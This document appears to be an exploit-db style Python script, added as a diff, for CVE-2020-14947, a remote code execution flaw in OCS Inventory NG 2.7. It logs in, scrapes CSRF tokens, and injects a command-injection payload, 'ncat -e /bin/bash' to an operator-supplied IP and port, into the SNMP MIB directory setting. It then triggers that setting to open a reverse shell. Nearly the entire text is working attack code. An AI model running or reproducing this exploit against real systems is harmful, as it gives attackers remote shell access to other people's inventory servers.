@@ -1,0 +1,119 @@
+# Exploit Title: OCS Inventory NG 2.7 - Remote Code Execution
+# Date: 2020-06-05
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE: CVE-2020-14947
+# Vendor Homepage: https://ocsinventory-ng.org/
+# Version: v2.7
+# Tested on: Ubuntu 18.04 / PHP 7.2.24
+
+#!/usr/bin/python3
+
+
+import requests
+import sys
+import warnings
+import random
+import string
+from bs4 import BeautifulSoup
+from urllib.parse import quote
+
+warnings.filterwarnings("ignore", category=3DUserWarning, module=3D'bs4')
+
+
+if len(sys.argv) !=3D 6:
+    print("[~] Usage : ./ocsng-exploit.py url username password ip port")
+    exit()
+
+url =3D sys.argv[1]
+username =3D sys.argv[2]
+password =3D sys.argv[3]
+ip =3D sys.argv[4]
+port =3D sys.argv[5]
+
+request =3D requests.session()
+
+
+def login():
+    login_info =3D {
+    "Valid_CNX": "Send",
+    "LOGIN": username,
+    "PASSWD": password
+    }
+    login_request =3D request.post(url+"/index.php", login_info)
+    login_text =3D login_request.text
+    if "User not registered" in login_text:
+        return False
+    else:
+        return True
+
+
+def inject_payload():
+    csrf_req =3D request.get(url+"/index.php?function=3Dadmin_conf")
+    content =3D csrf_req.text
+    soup =3D BeautifulSoup(content, "lxml")
+    first_token =3D soup.find_all("input", id=3D"CSRF_10")[0].get("value")
+    print("[+] 1st token : %s" % first_token)
+    first_data =3D {
+    "CSRF_10": first_token,
+    "onglet": "SNMP",
+    "old_onglet": "INVENTORY"
+    }
+    req =3D request.post(url+"/index.php?function=3Dadmin_conf", data=3Dfir=
+st_data)
+    content2 =3D req.text
+    soup2 =3D BeautifulSoup(content2, "lxml")
+    second_token =3D soup2.find_all("input", id=3D"CSRF_14")[0].get("value"=
+)
+    print("[+] 2nd token : %s" % second_token)
+    payload =3D "; ncat -e /bin/bash %s %s #" % (ip, port)
+    #RELOAD_CONF=3D&Valid=3DUpdate
+    inject_request =3D {
+    "CSRF_14": second_token,
+    "onglet": "SNMP",
+    "old_onglet": "SNMP",
+    "SNMP": "0",
+    "SNMP_INVENTORY_DIFF": "1",
+    # The payload should be here
+    "SNMP_MIB_DIRECTORY": payload,
+    "RELOAD_CONF": "",
+    "Valid": "Update"
+    }
+    final_req =3D request.post(url+"/index.php?function=3Dadmin_conf", data=
+=3Dinject_request)
+    if "Update done" in final_req.text:
+        print("[+] Payload injected successfully")
+        execute_payload()
+
+
+def execute_payload():
+    csrf_req =3D request.get(url+"/index.php?function=3DSNMP_config")
+    content =3D csrf_req.text
+    soup =3D BeautifulSoup(content, "lxml")
+    third_token =3D soup.find_all("input", id=3D"CSRF_22")[0].get("value")
+    third_request =3D request.post(url+"/index.php?function=3DSNMP_config",=
+ files=3D{
+    'CSRF_22': (None, third_token),
+    'onglet': (None, 'SNMP_MIB'),
+    'old_onglet': (None, 'SNMP_RULE'),
+    'snmp_config_length': (None, '10')
+    })
+    print("[+] 3rd token : %s" % third_token)
+    third_request_text =3D third_request.text
+    soup =3D BeautifulSoup(third_request_text, "lxml")
+    forth_token =3D soup.find_all("input", id=3D"CSRF_26")[0].get("value")
+    print("[+] 4th token : %s" % forth_token)
+    print("[+] Triggering payload ..")
+    print("[+] Check your nc ;)")
+    forth_request =3D request.post(url+"/index.php?function=3DSNMP_config",=
+ files=3D{
+    'CSRF_26': (None, forth_token),
+    'onglet': (None, 'SNMP_MIB'),
+    'old_onglet': (None, 'SNMP_MIB'),
+    'update_snmp': (None, 'send')
+    })
+
+
+
+if login():
+    print("[+] Valid credentials!")
+    inject_payload()
